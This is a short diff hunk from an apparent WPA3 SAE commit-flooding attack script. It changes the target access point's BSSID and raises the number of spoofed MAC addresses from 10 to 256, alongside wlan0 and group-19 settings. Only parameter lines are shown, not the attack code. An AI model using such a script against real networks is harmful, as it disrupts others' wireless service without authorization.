@@ -54,8 +54,8 @@ def commit_attack(count, iface):
 
 group = b'\x13\x00'
 confirm = 'valid_confirm'
-bssid = 'E2:06:D2:18:E3:21'
-count = 10
+bssid = '0A:AF:03:7A:09:6C'
+count = 256
 iface = 'wlan0'
 
 create_mac_file(count, 'mac_addresses.txt')
